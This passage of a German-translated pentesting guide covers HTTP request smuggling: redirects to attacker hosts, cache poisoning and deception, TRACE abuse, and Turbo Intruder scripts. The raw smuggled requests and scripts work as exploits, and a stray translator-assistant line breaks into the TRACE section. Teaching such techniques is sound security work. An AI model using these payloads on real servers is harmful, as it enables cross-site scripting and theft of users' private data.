Anwendungen leiten häufig von einer URL zu einer anderen weiter, indem der Hostname aus dem `Host`-Header in der Redirect-URL verwendet wird. Das ist üblich bei Webservern wie Apache und IIS. Fordert man z. B. ein Verzeichnis ohne abschließenden Slash an, führt das zu einem Redirect, der den Slash ergänzt:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Führt zu:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Obwohl es auf den ersten Blick harmlos wirkt, kann dieses Verhalten mit HTTP request smuggling ausgenutzt werden, um Benutzer auf eine externe Website umzuleiten. Zum Beispiel:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Diese geschmuggelte Anfrage könnte dazu führen, dass die nächste verarbeitete Benutzeranfrage auf eine vom Angreifer kontrollierte Website umgeleitet wird:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Ergibt:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
In diesem Szenario wird die Anfrage eines Nutzers nach einer JavaScript-Datei abgefangen. Der Angreifer kann den Nutzer potenziell kompromittieren, indem er bösartigen JavaScript-Code zurückliefert.

### Ausnutzen von Web Cache Poisoning via HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning kann ausgeführt werden, wenn irgendeine Komponente der **Front-End-Infrastruktur Inhalte zwischenspeichert**, typischerweise zur Leistungssteigerung. Durch Manipulation der Serverantwort ist es möglich, den Cache zu **poison the cache**.

Zuvor haben wir gesehen, wie Serverantworten so verändert werden können, dass ein 404-Fehler zurückgegeben wird (siehe [Basic Examples](#basic-examples)). Ebenso ist es möglich, den Server dazu zu bringen, `/index.html`-Inhalt als Antwort auf eine Anfrage für `/static/include.js` zu liefern. Folglich wird der Inhalt von `/static/include.js` im Cache durch den von `/index.html` ersetzt, wodurch `/static/include.js` für Nutzer unzugänglich wird und potenziell zu einem Denial of Service (DoS) führt.

Diese Technik wird besonders gefährlich, wenn eine **Open Redirect vulnerability** entdeckt wird oder wenn es eine **on-site redirect to an open redirect** gibt. Solche Schwachstellen können ausgenutzt werden, um den gecachten Inhalt von `/static/include.js` durch ein Skript des Angreifers zu ersetzen, was im Wesentlichen einen weitreichenden Cross-Site Scripting (XSS)-Angriff gegen alle Clients ermöglicht, die die aktualisierte `/static/include.js` anfordern.

Nachstehend eine Illustration, wie **cache poisoning combined with an on-site redirect to open redirect** ausgenutzt werden kann. Ziel ist es, den Cache-Inhalt von `/static/include.js` so zu verändern, dass JavaScript-Code des Angreifers ausgeliefert wird:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Beachte die eingebettete Anfrage, die auf `/post/next?postId=3` abzielt. Diese Anfrage wird an `/post?postId=4` umgeleitet, wobei der **Host header value** zur Bestimmung der Domain verwendet wird. Durch Ändern des **Host header** kann der Angreifer die Anfrage auf seine Domain umleiten (**on-site redirect to open redirect**).

Nach erfolgreichem **socket poisoning** sollte eine **GET request** für `/static/include.js` initiiert werden. Diese Anfrage wird durch die vorherige **on-site redirect to open redirect**-Anfrage kontaminiert und lädt den Inhalt des vom Angreifer kontrollierten Scripts.

Anschließend liefert jede Anfrage für `/static/include.js` den zwischengespeicherten Inhalt des Scripts des Angreifers und startet damit effektiv einen weitreichenden XSS-Angriff.

### Verwendung von HTTP request smuggling zur Durchführung von web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Was ist der Unterschied zwischen web cache poisoning und web cache deception?**
>
> - In **web cache poisoning**, der Angreifer veranlasst die Anwendung, bösartigen Inhalt im Cache zu speichern, und dieser Inhalt wird aus dem Cache an andere Anwender der Anwendung ausgeliefert.
> - In **web cache deception**, der Angreifer veranlasst die Anwendung, sensible Inhalte eines anderen Benutzers im Cache zu speichern, und der Angreifer ruft diese Inhalte anschließend aus dem Cache ab.

Der Angreifer erstellt eine geschmuggelte Anfrage, die sensible, benutzerspezifische Inhalte abruft. Betrachten Sie folgendes Beispiel:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
`` \ `0`\ ``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Wenn diese smuggled request einen cache entry vergiftet, der für static content vorgesehen ist (z. B. `/someimage.png`), könnten die sensitive data des victims von `/private/messages` unter dem cache entry des static content zwischengespeichert werden. Folglich könnte der attacker diese zwischengespeicherten sensitive data abrufen.

### Missbrauch von TRACE mittels HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

[**In this post**](https://portswigger.net/research/trace-desync-attack) schlägt vor, dass, wenn der Server die Methode TRACE aktiviert hat, es möglich sein könnte, diese mittels HTTP Request Smuggling auszunutzen. Das liegt daran, dass diese Methode jeden an den Server gesendeten header als Teil des body der response zurückspiegelt. Zum Beispiel:
```
TRACE / HTTP/1.1
Host: example.com
XSS: <script>alert("TRACE")</script>
```
Bitte fügen Sie den Inhalt der Datei src/pentesting-web/http-request-smuggling/README.md hier ein. Ich übersetze den relevanten englischen Text ins Deutsche und lasse dabei Code, Technik‑/Toolnamen, Tags, Links, Pfade und die Markdown/HTML-Syntax unverändert. Sie können den Inhalt auch in mehreren Nachrichten senden, falls er sehr lang ist.
```
HTTP/1.1 200 OK
Content-Type: message/http
Content-Length: 115

TRACE / HTTP/1.1
Host: vulnerable.com
XSS: <script>alert("TRACE")</script>
X-Forwarded-For: xxx.xxx.xxx.xxx
```
Ein Beispiel, wie man dieses Verhalten ausnutzen kann, wäre, zunächst eine HEAD request zu smuggle. Diese request wird nur mit den headers einer GET request beantwortet (unter anderem **`Content-Type`**). Und unmittelbar nach der HEAD request eine TRACE request zu smuggle, die die gesendeten Daten reflektiert.\
Da die HEAD response einen `Content-Length` header enthält, wird die response der TRACE request als Body der HEAD response behandelt und spiegelt daher beliebige Daten in der response wider.\
Diese response wird an die next request über die Verbindung gesendet, sodass dies z. B. in einer gecachten JS file verwendet werden könnte, um beliebigen JS code zu injizieren.**

### Missbrauch von TRACE via HTTP Response Splitting <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Continue following [**this post**](https://portswigger.net/research/trace-desync-attack) is suggested another way to abuse the TRACE method. Wie bereits kommentiert, ermöglicht das smuggling einer HEAD request und einer TRACE request, einige reflektierte Daten in der response auf die HEAD request zu kontrollieren. Die Länge des Bodys der HEAD request wird im Wesentlichen durch den Content-Length header angegeben und wird durch die response auf die TRACE request gebildet.

Daher lautet die neue Idee: Kennt man diesen Content-Length und die in der TRACE response enthaltenen Daten, ist es möglich, die TRACE response so zu gestalten, dass sie nach dem letzten Byte des Content-Length eine gültige HTTP response enthält. Dadurch kann ein Angreifer die request zur next response vollständig kontrollieren (was z. B. für cache poisoning genutzt werden könnte).

Example:
```
GET / HTTP/1.1
Host: example.com
Content-Length: 360

HEAD /smuggled HTTP/1.1
Host: example.com

POST /reflect HTTP/1.1
Host: example.com

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok\r\n
Content-Type: text/html\r\n
Cache-Control: max-age=1000000\r\n
Content-Length: 44\r\n
\r\n
<script>alert("response splitting")</script>
```
Wird diese Antworten erzeugen (beachte, wie die HEAD-Antwort eine Content-Length hat, wodurch die TRACE-Antwort Teil des HEAD body wird und sobald die HEAD Content-Length endet, eine gültige HTTP-Antwort geschmuggelt wird):
```
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 0

HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 165

HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 243

SOME_PADDINGXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXHTTP/1.1 200 Ok
Content-Type: text/html
Cache-Control: max-age=1000000
Content-Length: 50

<script>alert(“arbitrary response”)</script>
```
### Weaponisierung von HTTP Request Smuggling durch HTTP Response Desynchronisation

Hast du eine HTTP Request Smuggling-Schwachstelle gefunden und weißt nicht, wie du sie ausnutzen kannst? Probiere diese anderen Ausnutzungsmethoden:


{{#ref}}
../http-response-smuggling-desync.md
{{#endref}}

### Weitere HTTP Request Smuggling-Techniken

- Browser HTTP Request Smuggling (Client Side)


{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

- Request Smuggling in HTTP/2 Downgrades


{{#ref}}
request-smuggling-in-http-2-downgrades.md
{{#endref}}

## Turbo intruder scripts

### CL.TE

Von [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

Von: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Werkzeuge

- HTTP Hacker (Burp BApp Store) – zur Visualisierung von Verkettung/Framing und niedrigstufigem HTTP‑Verhalten
- https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda Burp Repeater benutzerdefinierte Aktion "Smuggling or pipelining?"
- [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
- [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
- [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
- [https://github.com/Moopinger/smugglefuzz](https://github.com/Moopinger/smugglefuzz)
- [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Dieses Tool ist ein grammatikbasierter HTTP Fuzzer, nützlich, um ungewöhnliche request smuggling‑Abweichungen zu finden.

## Referenzen

- [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
- [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
- [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
- [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
- [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
- [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
- [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)
- [https://portswigger.net/research/trace-desync-attack](https://portswigger.net/research/trace-desync-attack)
- [https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- Vorsicht vor dem false false‑positive: wie man HTTP pipelining von request smuggling unterscheidet – [https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling](https://portswigger.net/research/how-to-distinguish-http-pipelining-from-request-smuggling)
- [https://http1mustdie.com/](https://http1mustdie.com/)
- Browser‑Powered Desync Attacks – [https://portswigger.net/research/browser-powered-desync-attacks](https://portswigger.net/research/browser-powered-desync-attacks)
- PortSwigger Academy – client‑side desync – [https://portswigger.net/web-security/request-smuggling/browser/client-side-desync](https://portswigger.net/web-security/request-smuggling/browser/client-side-desync)
- [https://portswigger.net/research/http1-must-die](https://portswigger.net/research/http1-must-die)


{{#include ../../banners/hacktricks-training.md}}
